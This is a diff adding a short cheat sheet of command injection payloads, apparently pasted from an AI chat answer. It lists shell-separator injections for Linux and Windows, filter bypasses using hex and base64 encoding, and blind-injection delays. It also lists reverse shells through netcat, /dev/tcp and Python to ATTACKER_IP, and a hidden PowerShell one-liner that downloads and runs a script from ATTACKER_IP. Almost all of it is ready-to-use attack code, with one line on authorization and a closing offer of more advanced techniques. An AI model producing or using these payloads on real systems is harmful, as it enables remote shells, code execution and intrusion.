@@ -1,0 +1,108 @@
+Command Injection Payloads 🚀
+Command injection vulnerabilities occur when user input is improperly sanitized and passed directly to system commands. Here are some common payloads for testing and exploiting such vulnerabilities.
+
+1. Basic Command Injection
+Linux/Unix
+bash
+Copy
+Edit
+; ls -la
+| ls -la
+&& ls -la
+|| ls -la
+$(ls -la)
+`ls -la`
+Windows
+cmd
+Copy
+Edit
+& dir
+| dir
+&& dir
+|| dir
+%COMSPEC% /c dir
+2. Appending Additional Commands
+Linux
+bash
+Copy
+Edit
+; whoami
+| whoami
+&& whoami
+|| whoami
+$(whoami)
+`whoami`
+Windows
+cmd
+Copy
+Edit
+& whoami
+| whoami
+&& whoami
+|| whoami
+3. Writing to a File (Proof of Exploit)
+Linux
+bash
+Copy
+Edit
+echo "hacked" > /tmp/pwned
+Windows
+cmd
+Copy
+Edit
+echo hacked > C:\pwned.txt
+4. Reverse Shell (Linux)
+Netcat
+bash
+Copy
+Edit
+nc -e /bin/sh ATTACKER_IP 4444
+OR
+
+bash
+Copy
+Edit
+/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+Python Reverse Shell
+python
+Copy
+Edit
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+5. Reverse Shell (Windows)
+Netcat
+cmd
+Copy
+Edit
+nc.exe -e cmd.exe ATTACKER_IP 4444
+PowerShell Reverse Shell
+powershell
+Copy
+Edit
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')"
+6. Bypassing Filters
+Using Hex Encoding
+bash
+Copy
+Edit
+; $(echo -e '\x2F\x62\x69\x6E\x2F\x62\x61\x73\x68')
+Using Base64
+bash
+Copy
+Edit
+echo d2hvYW1pCg== | base64 -d | sh
+7. Delaying Execution (Blind Injection)
+If you suspect a blind command injection, use a delay:
+
+bash
+Copy
+Edit
+ping -c 10 127.0.0.1
+sleep 10
+For Windows:
+
+cmd
+Copy
+Edit
+ping 127.0.0.1 -n 10
+timeout /T 10
+These payloads can be used for testing (with proper authorization). Let me know if you need more advanced techniques! 🚀
